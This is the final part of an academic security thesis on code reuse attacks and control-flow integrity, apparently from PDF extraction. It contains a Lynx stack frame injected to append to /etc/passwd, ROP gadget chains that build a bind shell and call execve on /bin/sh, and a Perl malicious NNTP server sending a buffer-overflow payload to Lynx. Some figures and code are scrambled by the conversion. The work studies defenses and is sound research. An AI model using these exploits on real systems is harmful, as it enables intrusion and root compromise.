0x080e9cf0 : je
0x080e9cf2 : mov
0x080e9cf5 : call
0x080e9cfa : test
0x080e9cfc : je
0x080e9cfe : mov
0x080e9d02 : mov
0x080e9d06 : mov
0x080e9d0a : add
0x080e9d0d : jmp
0x080e9d12 : lea
0x080e9d18 : xor
0x080e9d1a : mov
0x080e9d1e : mov
0x080e9d22 : add
0x080e9d25 : ret
0x8(%ebp),%eax
%eax,(%esp)
0x808f594 
-0x10(%ebp),%edx
%eax,0xc(%edx)
-0x10(%ebp),%eax
0xc(%eax),%eax
%eax,-0xc(%ebp)
-0xc(%ebp),%eax
%ebx,%ebx
%eax,%esi
0x80e9cfa 
%ebx,(%esp)
0x8049e70 
%esi,%esi
0x80e9d18 
%esi,0x20(%esp)
0x14(%esp),%ebx
0x18(%esp),%esi
$0x1c,%esp
0x80be294 
0x0(%esi),%esi
%eax,%eax
0x14(%esp),%ebx
0x18(%esp),%esi
$0x1c,%esp
Figure 6-7: Assembly code for gadgets used by the root inserter
66
Figure 6-8: Injected stack frame to open a ﬁle in append mode before downloading. Pseu-
docode for the gadgets is given on the right
67
Returnaddress = 0x080e9cec(HTFile.c:1286)fname=“/etc/passwd”Saved $ebp=$ebp+8Returnaddress = 0x0808fae0(LYUtils.c:6088)name= &fnameSaved $ebp=&name­0x4 returnfopen(fname,‘a’);fp= eaxreturnHTFWriter_new(fp)68
Chapter 7
Conclusion
In this thesis we built a model of the code reuse space where statements about attacker
assumptions, the defenses that prevent them, and the requirements for those defenses are
represented as propositional formulas. The model included information about malware and
defenses that have been deployed in the real world as well as ideas that have been pro-
posed by the academic community. We used a SAT-solver to search the space for insecure
conﬁgurations and to generate ideas about where to look for new attacks or defenses.
We used the model to analyze the security of two applications running with the security
features available in an Ubuntu Server: a document viewer and a web server. We showed
that DEP, ASLR and system call ﬁltering were sufﬁcient to protect the document viewer
while the web server was vulnerable to code reuse attacks, because system call ﬁltering
cannot be used with a program that needs to use sensitive functionality and ASLR is vul-
nerable to brute force attacks when programs will respond to multiple requests from a user
(as in the case of the web server).
We also used the model to suggest and construct several new classes of attacks: pure
ROP payloads, return-into-libn and Turing complete return-into-libn. These attacks proved
by construction that the current corpus of proposed defenses against code reuse attacks are
not sufﬁcient to prevent practical attacks.
Finally, we investigated the security of proposed CFI defenses. We used a graph to
model the possible behavior of a program protected by CFI, with nodes representing basic
blocks and edges representing allowed control ﬂow transfers. We developed an interactive
69
search algorithm to aid in developing code reuse attacks that work in the presence of CFI
defenses by only following edges that are allowed by the defense.
With the results of our analysis, we developed several payloads: an uploader, a down-
loader a root inserter and a call to system using Lynx as a test case. These attacks demon-
strate that the control ﬂow graph enforced by CFI defenses is too permissive and still allows
malicious behavior and that CFI is not a comprehensive defense against code reuse attacks.
Future research using our systematic model could expand it to other attack and defense
spaces. For example, the techniques we used could also be applied to the network security
space to model the possible ways to attack a given network conﬁguration. The model could
also be expanded beyond a simple satisﬁablity instance. It could incorporate factors such
as costs to the attacker and the defender and probablistic scenarios to answer questions
that require a more complicated answer than a simple true/false. This would help quantify
the protection provided by defenses that are not comprehensive and help systems adminis-
trators make informed decisions about the tradeoffs between security and other important
factors such as cost and performance.
Future research on CFI defenses should focus on determining whether it is possible to
enforce a CFG that is restrictive enough to prevent attackers from developing practical code
reuse payloads while still allowing the program to function normally. Systems that build the
call graph using techniques like dynamic instrumentation rather than static analysis should
also be investigated. Additional research could also be done to investigate the behavior of
systems which combine shadow call stacks with CFI.
70
Appendix A
Pure ROP Payload Gadgets
In this appendix we present the gadgets used in the pure ROP payloads described in Section
4.4.1.
Figure A-1: ROP gadget for dup2 (duplicate a ﬁle descriptor)
71
pop ecxpop eaxint 0x80pop ebppop edipop esipop ebx0xFF0xFF0xFF0xFFmov eax,edxmov eax,[eax]xchg eax,edxmov ebx,edx0x000x3fdup2()std stream idFigure A-2: ROP gadget for accept
Figure A-3: ROP gadget for sendfile
72
int 0x80pop ebppop edipop esipop ebxpop eaxpop ebx0xFF0xFF0xFF0xFF0x660x5xchg eax,edxmov ebx,edxpop edxadd eax,edx0x8xchg ebx,ecxmov [eax], ecxaccept()socket_callint 0x80pop ebppop edipop esipop ebxpop edxpop eax0x000xFF0xFF0xFF0xFF0xBBsendfile()Figure A-4: ROP gadget for bind
73
pop ecxpop edx0x0100007f0x04sub eax, edxint 0x80pop ebppop edipop esipop ebx0xFF0xFF0xFF0xFFmov [eax], ecx0xAAAA00020x040x100x04mov ebx,edxxchg ebx,ecxxchg eax,edxpop edx0x10add eax, edx0x20x66mov eax,edxmov eax,[eax]localhostmode/portbind()socket_callFigure A-5: ROP gadget for execve
74
mov eax,edxint 0x80pop ebppop edipop esipop ebx0xFF0xFF0xFF0xFFpop ecxpop edxsub eax,edxxchg eax,edxmov [eax], ecx0x000x40x68732f2f0x40x6e69622f0x4mov ebx,edx0x000x000x0bpop eaxhs/nib/execve()Figure A-6: ROP gadget for listen
Figure A-7: ROP gadget for open
75
pop ecxpop edx0x000x04mov [eax], ecxsub eax, edxxchg ebx,ecxxchg eax,edxmov ebx,edxint 0x80pop ebppop edipop esipop ebxpop eaxpop ebx0xFF0xFF0xFF0xFF0x660x4listen()socket_callint 0x80pop ebppop edipop esipop ebxpop ecxpop edx0x4010x050x4xchg eax,edxmov ebx,edxpop edxadd eax,edx0xFF0xFF0xFF0xFFmov [eax], ecxpop ecxpop eaxfile_nameopen()O_APPEND|O_WRONLYFigure A-8: ROP gadget for socket
76
pop ecxpop edx0x010x04sub eax, edxint 0x80pop ebppop edipop esipop ebx0xFF0xFF0xFF0xFFmov [eax], ecx0x020x66pop ecxpop ebx0x010xFFxchg eax,edxmov ebx,edxxchg ebx,ecxpop edx0x4add eax, edxSOCK_STREAMWord sizeAF_INETsocket_call()socket() codeWord sizeFigure A-9: ROP gadget to set up the phantom stack
77
0x2D0x000xFF0xFF0xFF0xFF0x140x2D0xFF0xFF0xFF0xFFpop eaxpop ebxint 0x80pop ebppop edipop esipop ebxpop edxadd eax, edxxchg eax,edxmov ebx, edxsbrk ()Stack SizePaddingsbrk ()Figure A-10: ROP gadget for write
78
int 0x80pop ebppop edipop esipop ebxpop ecxpop edx0x4xchg eax,edxmov ebx,edxpop edx0xFF0xFF0xFF0xFFmov [eax], ecxinsert_stringxchg ebx,ecxpop eax0x04string_lenwrite()Appendix B
Malicious NNTP Server
#!/usr/bin/perl --
use strict;
use IO::Socket;
$main::port = 119;
$main::timeout = 5;
# *** SUBROUTINES ***
sub mysend($$)
{
my $file = shift;
my $str = shift;
print $file "$str\n";
print "SENT:
$str\n";
} # sub mysend
sub myreceive($)
79
{
my $file = shift;
my $inp;
eval
{
local $SIG{ALRM} = sub { die "alarm\n" };
alarm $main::timeout;
$inp = ;
alarm 0;
};
if ($@ eq "alarm\n") { $inp = ’’; print "TIMED OUT\n"; }
$inp =˜ tr/\015\012\000//d;
print "RECEIVED:
$inp\n";
$inp;
} # sub myreceive
# *** MAIN PROGRAM ***
{
my $server = IO::Socket::INET->new( Proto
=> ’tcp’,
LocalPort => $main::port,
Listen
=> SOMAXCONN,
Reuse
=> 1);
die "can’t set up server!\n" unless $server;
while (my $client = $server->accept())
{
80
$client->autoflush(1);
print ’connection from ’.$client->peerhost."\n";
mysend($client, ’200 Internet News’);
my $group = ’alt.angst’;
while (my $str = myreceive($client))
{
if ($str =˜ m/ˆmode reader$/i)
{
}
mysend($client, ’200 Internet News’);
next;
if ($str =˜ m/ˆgroup ([-_.a-zA-Z0-9]+)$/i)
{
}
$group = $1;
mysend($client, "211 1 1 1 $group");
next;
if ($str =˜ m/ˆquit$/i)
{
}
mysend($client, ’205 Goodbye’);
last;
if ($str =˜ m/ˆhead ([0-9]+)$/i)
{
81
#ebp + 16 (location of arguments)
my $evil = "\xe8\xe0\xff\xbf";
#padding, can be fixed if need more space for frame
$evil .= ’B’ x 32;
$evil .= ’H’ x 140;
#insert escape chars
$evil .= ’$@21(J’ x 40;
# more padding
$evil .= ’A’ x 12;
#overwrite p, the location data is being copied to
$evil .= "\xd4\xe0\xff\xbf" x 3;
#saved ebp (start of buf)
$evil .= "\xe8\xde\xff\xbf";
#then return address
$evil .= "\x14\x14\x09\x08";
# correct value for t
$evil .= "\x59\xe3\xff\xbf";
# something sensible for s (t+452)
$evil .= "\x1d\xe5\xff\xbf";
# argument to system
$evil .= "touch b;echo \"pwned\"";
my $head = 
Subject: $evil
Newsgroup: $group
Message-ID: 
.
82
HERE
$head =˜ s|\s+$||s;
mysend($client, $head);
next;
}
mysend($client, ’500 Syntax Error’);
} # while str=myreceive(client)
close $client;
print "closed\n\n\n";
} # while client=server->accept()
}
83
84
Bibliography
[1] Lynx. Online, 2013. http://lynx.isc.org/current/.
[2] Mart´ın Abadi, Mihai Budiu,
´Ulfar Erlingsson, and Jay Ligatti. Control-ﬂow in-
tegrity principles, implementations, and applications. ACM Trans. Inf. Syst. Secur.,
13(1):4:1–4:40, November 2009.
[3] Frances E. Allen. Control ﬂow analysis. SIGPLAN Not., 5(7):1–19, July 1970.
[4] Seth Arnold. Security features. Online, March 2013.
[5] Bennett, J. The number of the beast. http://www.ﬁreeye.com/blog/technical/cyber-
exploits/2013/02/the-number-of-the-beast.html.
[6] T. Bletsch, X. Jiang, V.W. Freeh, and Z. Liang. Jump-oriented programming: A new
class of code-reuse attack. In Proc. of the 6th ACM CCS, 2011.
[7] Brandon Bray.
Compiler
security checks
in depth.
Online,
2002.
http://msdn.microsoft.com/en-us/library/aa290051%28v=vs.71%29.aspx.
[8] c0ntex. Bypassing non-executable-stack during exploitation using return-to-libc,
2005.
[9] S. Checkoway, L. Davi, A. Dmitrienko, A.R. Sadeghi, H. Shacham, and M. Winandy.
Return-oriented programming without returns. In Proc. of the 17th ACM CCS, pages
559–572, 2010.
[10] Apple Corporation.
Application
code
signing.
Online,
2013.
https://developer.apple.com/library/ios/documentation/general/conceptual/devped
ia-cocoacore/AppSigning.html.
[11] Microsoft Corporation.
Introduction to code signing.
Online, 2013.
http://msdn.microsoft.com/en-us/library/ms537361%28v=vs.85%29.aspx.
[12] Crispin Cowan, Steve Beattie, John Johansen, and Perry Wagle. Pointguard: protect-
ing pointers from buffer overﬂow vulnerabilities. In Proceedings of the 12th USENIX
Security Symposium, 2003.
[13] Leonardo Mendona de Moura and Nikolaj Bjrner. Z3: An efﬁcient smt solver. In
Tools and Algorithms for the Construction and Analysis of Systems, 14th International
85
Conference (TACAS), volume 4963 of Lecture Notes in Computer Science, pages 337–
340. Springer, 2008.
[14] Peter Van Eeckhoutt. Chaining DEP with ROP, 2011.
[15] Hiroaki Etoh. Propolice: Gcc extension for protecting applications from stack-
IBM (April 2003), http://www.trl.ibm.com/projects/security/ssp,
smashing attacks.
2003.
[16] Ulf Harnhammar.
Lynx
remote
buffer
overﬂow.
Online,
2005.
http://lists.grok.org/pipermail/full-disclosure/2005-October/038019.html.
[17] Hex-Rays. Ida pro. https://www.hex-rays.com/products/ida/index.shtml.
[18] J. Hiser, A. Nguyen, M. Co, M. Hall, and J.W. Davidson. ILR: Where’d my gadgets
go. In IEEE Symposium on Security and Privacy, 2012.
[19] A. Homescu, M. Stewart, P. Larsen, S. Brunthaler, and M. Franz. Microgadgets: size
does matter in turing-complete return-oriented programming. In Proceedings of the
6th USENIX conference on Offensive Technologies, pages 7–7. USENIX Association,
2012.
[20] Hadi Katebi, Karem A Sakallah, and Jo˜ao P Marques-Silva. Empirical study of the
anatomy of modern sat solvers. In SAT, pages 343–356. Springer, 2011.
[21] Mehmet Kayaalp, Meltem Ozsoy, Nael Abu-Ghazaleh, and Dmitry Ponomarev.
In Proceed-
Branch regulation: low-overhead protection from code reuse attacks.
ings of the 39th International Symposium on Computer Architecture, pages 94–105,
2012.
[22] Brendan P. Kehoe. Zen and the art of the internet. Online, 1992.
[23] C. Kil, J. Jun, C. Bookholt, J. Xu, and P. Ning. Address space layout permutation
In Proc. of
(ASLP): Towards ﬁne-grained randomization of commodity software.
ACSAC’06, 2006.
[24] Johannes Kinder and Dmitry Kravchenko. Alternating control ﬂow reconstruction. In
Viktor Kuncak and Andrey Rybalchenko, editors, Veriﬁcation, Model Checking, and
Abstract Interpretation, volume 7148 of Lecture Notes in Computer Science, pages
267–282. Springer Berlin Heidelberg, 2012.
[25] Johannes Kinder and Helmut Veith. Jakstab: A static analysis platform for binaries.
In Computer Aided Veriﬁcation, pages 423–427. Springer, 2008.
[26] J. Li, Z. Wang, X. Jiang, M. Grace, and S. Bahram. Defeating return-oriented rootkits
with “return-less” kernels. In EuroSys, 2010.
[27] Nergal. The advanced return-into-lib(c) exploits (pax case study). Phrack Magazine,
58(4):54, Dec 2001.
86
[28] K. Onarlioglu, L. Bilge, A. Lanzi, D. Balzarotti, and E. Kirda. G-free: Defeating
In Proc. of ACSAC’10,
return-oriented programming through gadget-less binaries.
2010.
[29] Aleph One. Smashing the stack for fun and proﬁt. Phrack magazine, 7(49):14–16,
1996.
[30] PaX.
PaX
non-executable
pages
design
&
implem.
http://pax.grsecurity.net/docs/noexec.txt.
[31] Michalis Polychronakis, Kostas G. Anagnostakis, and Evangelos P. Markatos.
In Proc.
Emulation-based detection of non-self-contained polymorphic shellcode.
of RAID’07, pages 87–106, 2007.
[32] G.F. Roglia, L. Martignoni, R. Paleari, and D. Bruschi. Surgically returning to ran-
domized lib (c). In Proc. of ACSAC’09, 2009.
[33] Mark Russinovich. Windows internals. Microsoft, Washington, DC, 2009.
[34] H. Shacham. The geometry of innocent ﬂesh on the bone: Return-into-libc without
function calls (on the x86). In ACM CCS, 2007.
[35] Hovav Shacham, Matthew Page, Ben Pfaff, Eu-Jin Goh, Nagendra Modadugu, and
Dan Boneh. On the effectiveness of address-space randomization. In Proc. of ACM
CCS, pages 298–307, 2004.
[36] S. Sinnadurai, Q. Zhao, and W. fai Wong. Transparent runtime shadow stack: Protec-
tion against malicious return address modiﬁcations, 2008.
[37] K. Snow, F. Monrose, L. Davi, and A. Dmitrienko. Just-in-time code reuse: On the
effectiveness of ﬁne-grained address space layout randomization. In Proc. of IEEE
Symposium on Security and Privacy, 2013.
[38] R. Strackx, Y. Younan, P. Philippaerts, F. Piessens, S. Lachmund, and T. Walter.
Breaking the memory secrecy assumption. In Proc. of EuroSec’09, 2009.
[39] PaX Team. Pax address space layout randomization (aslr), 2003.
[40] M. Tran, M. Etheridge, T. Bletsch, X. Jiang, V. Freeh, and P. Ning. On the expres-
siveness of return-into-libc attacks. In Proc. of RAID’11, pages 121–141, 2011.
[41] Twitch. Taking advantage of non-terminated adjacent memory spaces. Phrack, 56,
2000.
[42] Arjan van de Ven. New security enhancements in red hat enterprise linux v. 3, update
3. Raleigh, North Carolina, USA: Red Hat, 2004.
[43] Michael Wachter and Rolf Haenni. Propositional dags: a new graph-based language
for representing boolean functions. KR, 6:277–285, 2006.
87
[44] Richard Wartell, Vishwath Mohan, Kevin W. Hamlen, and Zhiqiang Lin. Binary
stirring: self-randomizing instruction addresses of legacy x86 binary code. In Proc.
of ACM CCS, pages 157–168, 2012.
[45] H. Xu and S.J. Chapin. Improving address space randomization with a dynamic offset
randomization technique. In Proc. of the 2006 ACM symposium on Applied comput-
ing, 2006.
[46] Y. Younan, W. Joosen, and F. Piessens. Code injection in C and C++: A survey of vul-
nerabilities and countermeasures. Technical Report CW386, Katholieke Universiteit
Leuven, July 2004.
[47] Chao Zhang, Tao Wei, Zhaofeng Chen, Lei Duan, L. Szekeres, S. McCamant,
D. Song, and Wei Zou. Practical control ﬂow integrity and randomization for bi-
In Security and Privacy (SP), 2013 IEEE Symposium on, pages
nary executables.
559–573, 2013.
88
This work is sponsored by the Assistant Secretary of Defense for Research & Engi-
neering under Air Force Contract #FA872105C0002. Opinions, interpretations, conclu-
sions and recommendations are those of the author and are not necessarily endorsed by the
United States Government.
89